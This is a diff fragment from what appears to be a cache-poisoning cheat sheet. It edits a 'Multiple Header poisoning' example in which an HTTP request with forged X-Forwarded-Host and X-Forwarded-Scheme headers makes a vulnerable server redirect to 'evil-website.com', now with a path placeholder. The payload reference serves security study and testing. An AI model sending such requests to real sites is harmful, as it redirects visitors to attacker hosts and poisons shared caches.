@@ -57,14 +57,14 @@ X-Cache: miss, hit
 
 3. Multiple Header poisoning
 ```
-GET / HTTP/1.1
+GET /<PATH> HTTP/1.1
 Host: www.vuln.com
 X-Forwarded-Host: evil-website.com
 X-Forwarded-Scheme: nothttps
 
 ### Response:
 HTTP/1.1 301 Moved Permanently
-Location: https://evil-website.com/
+Location: https://evil-website.com/<PATH>
 ```
 
 4. User-agent Selective poisoning (unknown header)
